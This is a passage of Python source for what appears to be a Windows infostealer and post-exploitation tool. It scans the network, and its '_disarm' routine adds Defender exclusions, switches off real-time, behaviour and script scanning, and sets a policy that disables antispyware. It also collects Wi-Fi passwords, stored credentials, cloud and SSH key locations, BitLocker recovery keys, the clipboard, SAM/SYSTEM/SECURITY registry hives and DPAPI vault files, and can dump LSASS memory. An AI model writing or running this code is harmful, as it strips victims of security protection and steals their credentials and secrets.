             6379, 8000, 8080, 8081, 8443, 8888, 9000, 9200, 11211, 27017]
    LOCAL = [2375, 3306, 5432, 6379, 9200, 11211, 27017, 5984, 9090, 3000]

    def __init__(self) -> None:
        self.data: Dict[str, Any] = {"interfaces": [], "public": {}, "listening": [],
                                     "open": {}, "gateway": None, "dns": [], "arp": [],
                                     "shares": [], "mapped": []}

    def _interfaces(self) -> None:
        try:
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        self.data["interfaces"].append({"name": name, "ip": addr.address})
                        break
        except Exception:
            pass

    def _gateway(self) -> None:
        text = Win.run(["route", "print", "0.0.0.0"]) if IS_WIN else Win.run(["ip", "route"])
        hit = re.search(r"0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)", text) or \
              re.search(r"default via (\d+\.\d+\.\d+\.\d+)", text)
        self.data["gateway"] = hit.group(1) if hit else None

    def _public(self) -> None:
        for url in ("https://ipinfo.io/json", "https://api.ipify.org?format=json"):
            try:
                request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
                with urllib.request.urlopen(request, timeout=HTTP_TIMEOUT) as response:
                    payload = json.loads(response.read().decode("utf-8", "replace"))
                ip = payload.get("ip") or payload.get("query")
                if ip:
                    self.data["public"] = {"ip": ip, "city": payload.get("city"),
                                           "region": payload.get("region"),
                                           "country": payload.get("country"),
                                           "org": payload.get("org"),
                                           "asn": payload.get("asn"),
                                           "tz": payload.get("timezone")}
                    return
            except Exception:
                continue

    def _listening(self) -> None:
        text = Win.run(["netstat", "-ano"]) if IS_WIN else Win.run(["ss", "-tuln"])
        for line in text.splitlines():
            hit = re.search(r"(\d{1,3}(?:\.\d{1,3}){3}):(\d+)\s+\S+\s+LISTEN", line)
            if hit:
                self.data["listening"].append({"addr": hit.group(1),
                                               "port": int(hit.group(2))})

    def _dns(self) -> None:
        text = Win.run(["ipconfig", "/displaydns"]) if IS_WIN else \
            Win.run(["cat", "/etc/resolv.conf"])
        records = re.findall(r"Record Name\s*:\s*(\S+)|nameserver\s+(\S+)", text)
        self.data["dns"] = sorted({a or b for a, b in records})[:30]

    def _arp(self) -> None:
        for line in Win.run(["arp", "-a"]).splitlines():
            hit = re.match(r"\s*(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f\-]{17})", line, re.I)
            if hit:
                self.data["arp"].append({"ip": hit.group(1), "mac": hit.group(2)})

    def _shares(self) -> None:
        if not IS_WIN:
            return
        for line in Win.run(["net", "share"]).splitlines():
            parts = line.split()
            if parts and parts[0] not in ("Share", "The", "---"):
                self.data["shares"].append(parts[0])
        for line in Win.run(["net", "use"]).splitlines():
            if "\\\\" in line:
                self.data["mapped"].append(line.strip()[:160])

    @staticmethod
    def _probe(host: str, port: int) -> Optional[str]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(PORT_TIMEOUT)
        try:
            if sock.connect_ex((host, port)) != 0:
                return None
            try:
                sock.sendall(b"\r\n")
                return sock.recv(64).decode("latin-1", "ignore").strip()
            except Exception:
                return ""
        finally:
            sock.close()

    def _scan(self) -> None:
        targets = [("127.0.0.1", list(dict.fromkeys(self.LOCAL + self.PORTS)))]
        if self.data.get("gateway"):
            targets.append((self.data["gateway"], self.PORTS))
        jobs = [(h, p) for h, ports in targets for p in ports]
        with ThreadPoolExecutor(max_workers=90 if QUIET else PORT_WORKERS) as pool:
            futures = {pool.submit(self._probe, h, p): (h, p) for h, p in jobs}
            for future, (host, port) in futures.items():
                try:
                    banner = future.result()
                except Exception:
                    continue
                if banner is not None:
                    self.data["open"].setdefault(host, []).append(port)

    def run(self) -> Dict[str, Any]:
        for job in (self._interfaces, self._gateway, self._listening, self._dns,
                    self._arp, self._shares, self._public, self._scan):
            try:
                job()
            except Exception:
                continue
        return self.data


class Defenses:
    def __init__(self) -> None:
        self.out: Dict[str, Any] = {"av": [], "defender": {}, "exclusions": {},
                                    "asr": [], "bypass": [], "present": False,
                                    "edr": [], "drivers": []}

    def _av(self) -> None:
        raw = Win.ps("Get-CimInstance -Namespace root/SecurityCenter2 "
                     "-ClassName AntiVirusProduct | ForEach-Object { $_.displayName }")
        self.out["av"] = [line.strip() for line in raw.splitlines() if line.strip()][:8]
        self.out["present"] = any("defender" in name.lower() for name in self.out["av"])

    def _defender(self) -> None:
        raw = Win.ps("$s = Get-MpComputerStatus; $s | Select-Object "
                     "RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,"
                     "AntivirusEnabled,IsTamperProtected,AntispywareSignatureAge,"
                     "AntivirusSignatureVersion,AMServiceEnabled,OnAccessProtectionEnabled,"
                     "IsVirtualMachine | ConvertTo-Json")
        try:
            self.out["defender"] = json.loads(raw) if raw.strip().startswith("{") else {}
        except Exception:
            pass

        prefs = Win.ps("$p = Get-MpPreference; [pscustomobject]@{"
                       "RT=$p.DisableRealtimeMonitoring;BM=$p.DisableBehaviorMonitoring;"
                       "IOAV=$p.DisableIOAVProtection;SCRIPT=$p.DisableScriptScanning;"
                       "ARCH=$p.DisableArchiveScanning;PUA=$p.PUAProtection;"
                       "CFA=$p.EnableControlledFolderAccess;MAPS=$p.MAPSReporting;"
                       "PATHS=($p.ExclusionPath -join '|');PROCS=($p.ExclusionProcess -join '|');"
                       "EXTS=($p.ExclusionExtension -join '|')} | ConvertTo-Json")
        try:
            data = json.loads(prefs) if prefs.strip().startswith("{") else {}
        except Exception:
            data = {}
        self.out["exclusions"] = {
            "paths": (data.get("PATHS") or "").split("|")[:25],
            "processes": (data.get("PROCS") or "").split("|")[:25],
            "extensions": (data.get("EXTS") or "").split("|")[:25],
            "realtime_disabled": data.get("RT"),
            "behavior_disabled": data.get("BM"),
            "ioav_disabled": data.get("IOAV"),
            "script_disabled": data.get("SCRIPT"),
            "archive_disabled": data.get("ARCH"),
            "pua": data.get("PUA"),
            "controlled_folder": data.get("CFA"),
            "maps": data.get("MAPS"),
        }
        rules = Win.ps("(Get-MpPreference).AttackSurfaceReductionRules_Ids -join '|'")
        self.out["asr"] = [rule for rule in rules.strip().split("|") if rule][:40]

    def _stack(self) -> None:
        guards = ("msmpeng", "sentinel", "csagent", "carbonblack", "cylance", "sophos",
                  "ekrn", "avp", "mcshield", "bdagent", "tanium", "crowdstrike",
                  "elastic-endpoint", "cortex", "xagt", "cybereason")
        try:
            import psutil
            for proc in psutil.process_iter(["name"]):
                name = (proc.info["name"] or "").lower()
                if any(guard in name for guard in guards):
                    self.out["edr"].append(name)
        except Exception:
            pass
        self.out["edr"] = sorted(set(self.out["edr"]))[:15]
        self.out["drivers"] = [line.split()[0] for line in
                               Win.run(["driverquery", "/fo", "csv", "/nh"]).splitlines()
                               if any(guard in line.lower() for guard in
                                      ("defender", "wdfilter", "fltmgr", "crowd", "csagent",
                                       "sentinel", "carbon", "elastic"))][:20]

    def _firewall(self) -> None:
        raw = Win.run(["netsh", "advfirewall", "show", "allprofiles", "state"])
        self.out["firewall"] = {"off_profiles": raw.upper().count("OFF"), "raw": raw[:400]}

    def _misc(self) -> None:
        import winreg
        hklm = winreg.HKEY_LOCAL_MACHINE
        self.out["smartscreen"] = Win.reg(
            hklm, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled")
        self.out["tamper"] = Win.reg(
            hklm, r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection")
        self.out["vbs"] = Win.reg(
            hklm, r"SYSTEM\CurrentControlSet\Control\DeviceGuard",
            "EnableVirtualizationBasedSecurity")
        self.out["hvci"] = Win.reg(
            hklm, r"SYSTEM\CurrentControlSet\Control\DeviceGuard"
                  r"\Scenarios\HypervisorEnforcedCodeIntegrity", "Enabled")
        self.out["cred_guard"] = Win.reg(hklm, r"SYSTEM\CurrentControlSet\Control\LSA",
                                         "LsaCfgFlags")
        self.out["lsa_ppl"] = Win.reg(hklm, r"SYSTEM\CurrentControlSet\Control\Lsa", "RunAsPPL")
        self.out["bitlocker"] = "on" if "On" in Win.run(["manage-bde", "-status"], 30) else "?"

    def _disarm(self) -> None:
        if not IS_ADMIN:
            self.out["bypass"].append("no admin, partial only")
            return
        exe = Path(sys.executable)
        steps = (
            ("exclusion_dir", f"Add-MpPreference -ExclusionPath '{exe.parent}'"),
            ("exclusion_exe", f"Add-MpPreference -ExclusionPath '{exe}'"),
            ("exclusion_proc", f"Add-MpPreference -ExclusionProcess '{exe.name}'"),
            ("exclusion_temp", "Add-MpPreference -ExclusionPath $env:TEMP"),
            ("exclusion_appdata", "Add-MpPreference -ExclusionPath $env:APPDATA"),
            ("rt_off", "Set-MpPreference -DisableRealtimeMonitoring $true"),
            ("bm_off", "Set-MpPreference -DisableBehaviorMonitoring $true"),
            ("ioav_off", "Set-MpPreference -DisableIOAVProtection $true"),
            ("script_off", "Set-MpPreference -DisableScriptScanning $true"),
            ("archive_off", "Set-MpPreference -DisableArchiveScanning $true"),
            ("pua_off", "Set-MpPreference -PUAProtection 0"),
            ("cfa_off", "Set-MpPreference -EnableControlledFolderAccess Disabled"),
            ("maps_off", "Set-MpPreference -MAPSReporting 0"),
            ("samples_off", "Set-MpPreference -SubmitSamplesConsent 2"),
        )
        for label, command in steps:
            try:
                Win.ps(command, 35)
                self.out["bypass"].append(f"{label}: ok")
            except Exception:
                self.out["bypass"].append(f"{label}: fail")
        import winreg
        try:
            with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                    r"SOFTWARE\Policies\Microsoft\Windows Defender",
                                    0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            self.out["bypass"].append("policy_disable: ok")
        except Exception:
            self.out["bypass"].append("policy_disable: fail")

    def run(self, disarm: bool = True) -> Dict[str, Any]:
        for job in (self._av, self._defender, self._stack, self._firewall, self._misc):
            try:
                job()
            except Exception:
                continue
        if disarm:
            self._disarm()
        return self.out


class Audit:
    def __init__(self) -> None:
        self.findings: List[Dict[str, str]] = []

    def _add(self, item: str, detail: str, severity: str) -> None:
        self.findings.append({"item": item, "detail": detail, "sev": severity})

    def _windows(self) -> None:
        import winreg
        hklm = winreg.HKEY_LOCAL_MACHINE

        hotfix = Win.ps("(Get-CimInstance Win32_QuickFixEngineering).HotFixID")
        count = len([line for line in hotfix.splitlines() if line.strip()])
        self._add("Patches", f"{count} hotfix installed" if count else "no hotfix visible",
                  "info" if count else "medium")

        if Win.reg(hklm, r"SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters", "SMB1") == 1:
            self._add("SMBv1", "enabled", "high")
        if not Win.reg(hklm, r"SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters",
                       "RequireSecuritySignature"):
            self._add("SMB signing", "not required", "medium")
        if Win.reg(hklm, r"SYSTEM\CurrentControlSet\Control\Terminal Server",
                   "fDenyTSConnections") == 0:
            self._add("RDP", "enabled", "medium")
        if Win.reg(hklm, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                   "ConsentPromptBehaviorAdmin") == 0:
            self._add("UAC", "elevation without prompt", "high")
        if Win.reg(hklm, r"SYSTEM\CurrentControlSet\Control\Lsa", "RunAsPPL") != 1:
            self._add("LSA", "RunAsPPL missing, LSASS readable", "high")
        if Win.reg(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                   "DefaultPassword"):
            self._add("Autologon", "plaintext password in registry", "high")
        if Win.reg(hklm, r"SYSTEM\CurrentControlSet\Control\Lsa", "LimitBlankPasswordUse") != 1:
            self._add("Blank passwords", "remote use allowed", "low")
        if "RUNNING" in Win.run(["sc", "query", "WinRM"]):
            self._add("WinRM", "running", "medium")

        build = Win.reg(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild")
        try:
            if build and int(build) < 22000:
                self._add("Build", f"{build} outdated", "medium")
        except Exception:
            pass

        for provider in ("AppInit_DLLs", "Authentication Packages"):
            value = Win.reg(hklm, r"SYSTEM\CurrentControlSet\Control\Lsa", provider)
            if value:
                self._add(f"LSA {provider}", str(value)[:120], "info")

        ifeo = Win.subkeys(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                                 r"\Image File Execution Options")
        self._add("IFEO entries", str(len(ifeo)), "info")

    def _exposure(self, net: Dict[str, Any]) -> None:
        labels = {445: "SMB", 139: "NetBIOS", 3389: "RDP", 5985: "WinRM", 21: "FTP",
                  23: "Telnet", 3306: "MySQL", 1433: "MSSQL", 5900: "VNC"}
        for entry in net.get("listening", []):
            address, port = entry["addr"], entry["port"]
            if address.startswith("127."):
                continue
            label = labels.get(port)
            if label:
                self._add(f"{label} exposed", f"{address}:{port}",
                          "high" if port in (445, 139, 3389, 23, 21, 5900) else "medium")
        for port, label in ((2375, "Docker"), (6379, "Redis"), (27017, "Mongo"),
                            (9200, "Elastic"), (11211, "Memcached")):
            if port in net.get("open", {}).get("127.0.0.1", []):
                self._add("Local service", f"{label} on 127.0.0.1:{port}", "medium")

    def run(self, net: Dict[str, Any]) -> Dict[str, Any]:
        try:
            if IS_WIN:
                self._windows()
                self._exposure(net)
        except Exception:
            pass
        high = sum(1 for item in self.findings if item["sev"] == "high")
        medium = sum(1 for item in self.findings if item["sev"] == "medium")
        low = sum(1 for item in self.findings if item["sev"] == "low")
        penalty = min(45, high * 9) + min(30, medium * 4) + min(10, low * 2)
        return {"findings": self.findings, "score": max(0, 100 - penalty),
                "counts": {"high": high, "medium": medium, "low": low}}


class SystemInfo:
    def collect(self) -> Dict[str, Any]:
        data: Dict[str, Any] = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "host": socket.gethostname(), "user": self._user(),
            "domain": os.environ.get("USERDOMAIN"), "os": platform.platform(),
            "arch": platform.machine(), "admin": IS_ADMIN, "pid": os.getpid(),
            "cwd": os.getcwd(), "mac": self._mac(), "local_ip": self._local_ip(),
            "virtualized": self._virtualized(), "uptime": self._uptime(),
            "clipboard": self._clipboard(), "wifi": self._wifi(),
            "credentials": self._credentials(), "key_files": self._keys(),
            "env": self._env(), "installed": self._installed(),
        }
        if IS_WIN:
            import winreg
            version_key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            data.update({
                "product": Win.reg(winreg.HKEY_LOCAL_MACHINE, version_key, "ProductName"),
                "build": Win.reg(winreg.HKEY_LOCAL_MACHINE, version_key, "CurrentBuild"),
                "ubr": Win.reg(winreg.HKEY_LOCAL_MACHINE, version_key, "UBR"),
                "owner": Win.reg(winreg.HKEY_LOCAL_MACHINE, version_key, "RegisteredOwner"),
                "install": Win.reg(winreg.HKEY_LOCAL_MACHINE, version_key, "InstallDate"),
                "cpu": Win.reg(winreg.HKEY_LOCAL_MACHINE,
                               r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
                               "ProcessorNameString"),
                "bios": Win.reg(winreg.HKEY_LOCAL_MACHINE,
                                r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion"),
                "bios_date": Win.reg(winreg.HKEY_LOCAL_MACHINE,
                                     r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate"),
                "board": Win.reg(winreg.HKEY_LOCAL_MACHINE,
                                 r"HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct"),
                "serial": Win.ps("(Get-CimInstance Win32_BIOS).SerialNumber").strip(),
                "product_key": self._product_key(),
            })
        data.update(self._hardware())
        data["accounts"] = Accounts().run()
        data["persistence"] = Persistence().run()
        data["processes"] = self._processes()
        return data

    @staticmethod
    def _user() -> str:
        for variable in ("USERNAME", "USER", "LOGNAME"):
            if os.environ.get(variable):
                return os.environ[variable]
        try:
            import getpass
            return getpass.getuser()
        except Exception:
            return "?"

    @staticmethod
    def _local_ip() -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            address = sock.getsockname()[0]
            sock.close()
            return address
        except Exception:
            return "?"

    @staticmethod
    def _mac() -> str:
        node = uuid.getnode()
        return ":".join(f"{(node >> i) & 0xFF:02x}" for i in range(0, 48, 8)[::-1])

    @staticmethod
    def _virtualized() -> str:
        try:
            import winreg
            bios = Win.reg(winreg.HKEY_LOCAL_MACHINE,
                           r"HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName") or ""
            vendor = Win.reg(winreg.HKEY_LOCAL_MACHINE,
                             r"HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer") or ""
            blob = f"{bios} {vendor}".lower()
            for marker in ("vmware", "virtualbox", "qemu", "kvm", "xen", "parallels",
                           "hyper-v", "bochs"):
                if marker in blob:
                    return marker
            if IS_WIN:
                return "no"
            text = Path("/proc/cpuinfo").read_text(errors="ignore").lower()
            return "yes" if "hypervisor" in text else "no"
        except Exception:
            return "?"

    @staticmethod
    def _uptime() -> str:
        try:
            import psutil
            return str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
        except Exception:
            return "?"

    @staticmethod
    def _clipboard() -> str:
        try:
            if IS_WIN:
                user32 = ctypes.windll.user32
                if not user32.OpenClipboard(None):
                    return ""
                try:
                    if not user32.IsClipboardFormatAvailable(13):
                        return ""
                    handle = user32.GetClipboardData(13)
                    pointer = ctypes.windll.kernel32.GlobalLock(handle)
                    try:
                        return ctypes.wstring_at(pointer)[:2000]
                    finally:
                        ctypes.windll.kernel32.GlobalUnlock(handle)
                finally:
                    user32.CloseClipboard()
            return Win.run(["xclip", "-selection", "clipboard", "-o"], 6)[:2000]
        except Exception:
            return ""

    @staticmethod
    def _wifi() -> List[Dict[str, str]]:
        out: List[Dict[str, str]] = []
        if IS_WIN:
            for ssid in re.findall(r"All User Profile\s*:\s*(.+)",
                                   Win.run(["netsh", "wlan", "show", "profiles"])):
                ssid = ssid.strip()
                detail = Win.run(["netsh", "wlan", "show", "profile", ssid, "key=clear"])
                key = re.search(r"Key Content\s*:\s*(.+)", detail)
                out.append({"ssid": ssid, "password": key.group(1).strip() if key else "?"})
        else:
            for line in Win.run(["nmcli", "-s", "-g", "NAME,PASSWORD",
                                 "connection", "show"]).splitlines():
                if ":" in line:
                    ssid, password = line.split(":", 1)
                    out.append({"ssid": ssid, "password": password})
        return out

    @staticmethod
    def _credentials() -> List[Dict[str, str]]:
        if not IS_WIN:
            return []
        out: List[Dict[str, str]] = []
        current: Dict[str, str] = {}
        for line in Win.run(["cmdkey", "/list"]).splitlines():
            if ":" not in line:
                continue
            key, _, value = line.partition(":")
            key, value = key.strip().lower(), value.strip()
            if key.startswith("target"):
                if current:
                    out.append(current)
                current = {"target": value}
            elif key.startswith(("type", "user")):
                current[key.split()[0]] = value
        if current:
            out.append(current)
        return out

    @staticmethod
    def _keys() -> Dict[str, str]:
        checks = {"ssh": "~/.ssh/id_rsa", "ssh_dir": "~/.ssh", "aws": "~/.aws/credentials",
                  "aws_config": "~/.aws/config", "gcloud": "~/.config/gcloud",
                  "azure": "~/.azure", "git": "~/.git-credentials", "npmrc": "~/.npmrc",
                  "pypirc": "~/.pypirc", "netrc": "~/.netrc", "docker": "~/.docker/config.json",
                  "kube": "~/.kube/config", "winscp": "%APPDATA%/WinSCP.ini",
                  "filezilla": "%APPDATA%/FileZilla/sitemanager.xml",
                  "putty": "%APPDATA%/SimonTatham/PuTTY/sessions"}
        out: Dict[str, str] = {}
        for label, raw in checks.items():
            path = Path(os.path.expandvars(os.path.expanduser(raw)))
            if path.exists():
                out[label] = str(path)
        return out

    @staticmethod
    def _env() -> Dict[str, str]:
        keep = ("PATH", "TEMP", "USERPROFILE", "COMPUTERNAME", "PROCESSOR_IDENTIFIER",
                "JAVA_HOME", "GOPATH", "AWS_PROFILE", "DOCKER_HOST", "AZURE_CONFIG_DIR")
        return {key: value[:200] for key, value in os.environ.items() if key.upper() in keep}

    @staticmethod
    def _installed() -> List[str]:
        if not IS_WIN:
            return []
        import winreg
        out: List[str] = []
        for root, path in (
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER,
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")):
            for sub in Win.subkeys(root, path):
                name = Win.reg(root, f"{path}\\{sub}", "DisplayName")
                if name:
                    out.append(str(name)[:90])
        return sorted(set(out))[:80]

    @staticmethod
    def _product_key() -> Optional[str]:
        import winreg
        blob = Win.reg(winreg.HKEY_LOCAL_MACHINE,
                       r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId")
        if not isinstance(blob, (bytes, bytearray)) or len(blob) < 67:
            return None
        alphabet = "BCDFGHJKMPQRTVWXY2346789"
        raw = list(blob[52:67])
        chars = []
        for _ in range(25):
            carry = 0
            for index in range(14, -1, -1):
                carry = (carry << 8) + raw[index]
                raw[index] = carry // 24
                carry %= 24
            chars.append(alphabet[carry])
        key = "".join(reversed(chars))
        return "-".join(key[i:i + 5] for i in range(0, 25, 5))

    @staticmethod
    def _hardware() -> Dict[str, Any]:
        out: Dict[str, Any] = {"cpu_cores": os.cpu_count(), "gpu": [], "disks": [],
                               "monitors": 0, "resolution": ""}
        try:
            import psutil
            out["ram_gb"] = round(psutil.virtual_memory().total / 1024 ** 3, 2)
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    out["disks"].append({"device": partition.device, "fs": partition.fstype,
                                         "total_gb": round(usage.total / 1024 ** 3, 2),
                                         "free_gb": round(usage.free / 1024 ** 3, 2)})
                except Exception:
                    continue
            battery = psutil.sensors_battery()
            if battery:
                out["battery"] = {"percent": battery.percent, "plugged": battery.power_plugged}
        except Exception:
            pass
        if IS_WIN:
            user32 = ctypes.windll.user32
            out["monitors"] = user32.GetSystemMetrics(80)
            out["resolution"] = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
            for line in Win.run(["nvidia-smi", "--query-gpu=name,memory.total",
                                 "--format=csv,noheader"], 6).splitlines():
                if line.strip():
                    out["gpu"].append(line.strip())
            out["tpm"] = Win.ps("(Get-Tpm).TpmPresent").strip().lower()
            out["secure_boot"] = Win.ps("Confirm-SecureBootUEFI").strip().lower()
            out["bitlocker_keys"] = [
                line.strip() for line in
                Win.run(["manage-bde", "-protectors", "-get", "C:"], 30).splitlines()
                if re.search(r"\d{6}-\d{6}-\d{6}-\d{6}", line)][:4]
        return out

    @staticmethod
    def _processes() -> Dict[str, Any]:
        out: Dict[str, Any] = {"total": 0, "top": [], "interesting": []}
        watch = ("code", "steam", "discord", "riot", "valorant", "league", "vmware",
                 "virtualbox", "burp", "wireshark", "ida", "x64dbg", "obs", "slack")
        try:
            import psutil
            processes = list(psutil.process_iter(["pid", "name", "cpu_percent", "username"]))
            out["total"] = len(processes)
            ranked = sorted(processes, key=lambda proc: proc.info.get("cpu_percent") or 0,
                            reverse=True)[:15]
            out["top"] = [{"pid": proc.info["pid"], "name": proc.info["name"],
                           "cpu": proc.info["cpu_percent"], "user": proc.info["username"]}
                          for proc in ranked]
            for proc in processes:
                name = (proc.info.get("name") or "").lower()
                if any(token in name for token in watch):
                    out["interesting"].append(name)
            out["interesting"] = sorted(set(out["interesting"]))[:15]
        except Exception:
            pass
        return out


class Accounts:
    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"local": [], "admins": [], "sessions": [], "last_logon": []}
        if not IS_WIN:
            return out
        for line in Win.run(["net", "user"]).splitlines():
            for name in line.split():
                if name and not name.startswith("-"):
                    out["local"].append(name)
        out["local"] = [name for name in dict.fromkeys(out["local"])
                        if name not in ("The", "command")][:30]

        admins = Win.run(["net", "localgroup", "administrators"])
        out["admins"] = [line.strip() for line in admins.splitlines()
                         if line.strip() and not line.startswith(
                             ("Alias", "Comment", "Members", "The command", "-"))][:25]
        out["sessions"] = [line.strip() for line in Win.run(["qwinsta"]).splitlines()[1:10]]
        logon = Win.ps("Get-CimInstance Win32_NetworkLoginProfile | "
                       "Select-Object Name,LastLogon | ConvertTo-Json")
        try:
            parsed = json.loads(logon) if logon.strip().startswith(("[", "{")) else []
            if isinstance(parsed, dict):
                parsed = [parsed]
            out["last_logon"] = [f"{item.get('Name')}: {item.get('LastLogon')}"
                                 for item in parsed[:15]]
        except Exception:
            pass
        return out


class Persistence:
    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"run": {}, "tasks": [], "services": [], "startup": [],
                               "winlogon": {}, "wmi": []}
        if not IS_WIN:
            return out
        import winreg
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            for sub in (r"Software\Microsoft\Windows\CurrentVersion\Run",
                        r"Software\Microsoft\Windows\CurrentVersion\RunOnce"):
                values = Win.values(root, sub)
                if values:
                    out["run"][f"{label}\\{sub.split('\\')[-1]}"] = {
                        key: str(value)[:220] for key, value in list(values.items())[:15]}

        for line in Win.run(["schtasks", "/query", "/fo", "csv", "/nh"], 50).splitlines():
            parts = [part.strip('"') for part in line.split('","')]
            if len(parts) > 2 and "Microsoft" not in parts[0]:
                out["tasks"].append({"name": parts[0], "next": parts[1], "state": parts[2]})
        out["tasks"] = out["tasks"][:30]

        for line in Win.run(["sc", "query", "type=", "service", "state=", "all"], 50).splitlines():
            hit = re.match(r"SERVICE_NAME:\s*(\S+)", line)
            if hit and not hit.group(1).lower().startswith(("microsoft", "win", "wmi")):
                out["services"].append(hit.group(1))
        out["services"] = out["services"][:30]

        for folder in (Path(os.environ.get("APPDATA", "")) / "Microsoft/Windows/Start Menu"
                       "/Programs/Startup",
                       Path(os.environ.get("ProgramData", "")) / "Microsoft/Windows/Start Menu"
                       "/Programs/Startup"):
            try:
                out["startup"].extend(entry.name for entry in folder.iterdir())
            except Exception:
                continue

        winlogon = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        for name in ("Shell", "Userinit", "Taskman", "AppSetup"):
            value = Win.reg(winreg.HKEY_LOCAL_MACHINE, winlogon, name)
            if value:
                out["winlogon"][name] = value

        wmi = Win.ps("Get-CimInstance -Namespace root/subscription -ClassName "
                     "__EventFilter | Select-Object Name,Query | ConvertTo-Json")
        try:
            parsed = json.loads(wmi) if wmi.strip().startswith(("[", "{")) else []
            if isinstance(parsed, dict):
                parsed = [parsed]
            out["wmi"] = [f"{item.get('Name')}: {str(item.get('Query'))[:140]}"
                          for item in parsed[:10]]
        except Exception:
            pass
        return out


class Artifacts:
    """Hives, DPAPI blobs, credential vault files and optional LSASS dump."""

    def __init__(self) -> None:
        self.out: Dict[str, Any] = {"hives": {}, "dpapi": [], "vault": [],
                                    "lsass": None, "notes": []}

    def _hives(self) -> None:
        if not (IS_WIN and IS_ADMIN):
            self.out["notes"].append("hives need admin")
            return
        temp = Path(tempfile.mkdtemp(prefix="bg_"))
        try:
            for name, key in (("sam", "HKLM\\SAM"), ("system", "HKLM\\SYSTEM"),
                              ("security", "HKLM\\SECURITY")):
                destination = temp / f"{name}.hiv"
                Win.run(["reg", "save", key, str(destination), "/y"], 70)
                if not destination.is_file():
                    continue
                packed = zlib.compress(destination.read_bytes(), 9)
                if name == "system" and len(packed) > 6_000_000:
                    self.out["notes"].append(f"system hive too big: {len(packed)}")
                    continue
                self.out["hives"][name] = base64.b64encode(packed).decode()
        except Exception as exc:
            self.out["notes"].append(f"hives: {exc}")
        finally:
            shutil.rmtree(temp, ignore_errors=True)

    def _dpapi(self) -> None:
        if not IS_WIN:
            return
        for base in (Path(os.environ.get("APPDATA", "")) / "Microsoft/Protect",
                     Path(os.environ.get("APPDATA", "")) / "Microsoft/Credentials",
                     Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Credentials"):
            if not base.is_dir():
                continue
            for path in list(base.rglob("*"))[:40]:
                if not path.is_file() or path.stat().st_size > 40_000:
                    continue
                try:
                    record = {"file": str(path),
                              "b64": base64.b64encode(path.read_bytes()).decode()}
                    bucket = "vault" if "Credential" in str(base) else "dpapi"
                    self.out[bucket].append(record)
                except Exception:
                    continue

    def _lsass(self) -> None:
        if not (IS_WIN and IS_ADMIN):
            self.out["notes"].append("lsass needs admin")
            return
        try:
            import psutil
            pid = next((proc.pid for proc in psutil.process_iter(["name"])
                        if (proc.info["name"] or "").lower() == "lsass.exe"), None)
            if not pid:
                return
            temp = Path(tempfile.mkdtemp(prefix="bg_"))
            dump = temp / "lsass.dmp"
            Win.run(["rundll32", "C:\\Windows\\System32\\comsvcs.dll, MiniDump",
                     str(pid), str(dump), "full"], 90)
            if dump.is_file():
                packed = zlib.compress(dump.read_bytes(), 6)
                if len(packed) <= LSASS_CAP:
                    self.out["lsass"] = base64.b64encode(packed).decode()
                else:
                    self.out["notes"].append(f"lsass too big: {len(packed)}")
            shutil.rmtree(temp, ignore_errors=True)
        except Exception as exc:
            self.out["notes"].append(f"lsass: {exc}")

    def run(self, want_lsass: bool = False) -> Dict[str, Any]:
        self._hives()
        self._dpapi()
        if want_lsass:
            self._lsass()
        return self.out


class BrowserData:
    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"profiles": [], "history": [], "bookmarks": [],
                               "extensions": [], "downloads": [], "prefs": []}
        for name, root in Browsers.roots().items():
            for profile in Browsers.profiles(root):
                out["profiles"].append(f"{name}/{profile}")
                limit = 250 if AGGRESSIVE else 60
                out["history"].extend(self._history(root, profile, name, limit))
                out["bookmarks"].extend(self._bookmarks(root, profile, name))
                out["extensions"].extend(self._extensions(root, profile, name))
                out["downloads"].extend(self._downloads(root, profile, name))
                out["prefs"].extend(self._prefs(root, profile, name))
        return out

    @staticmethod
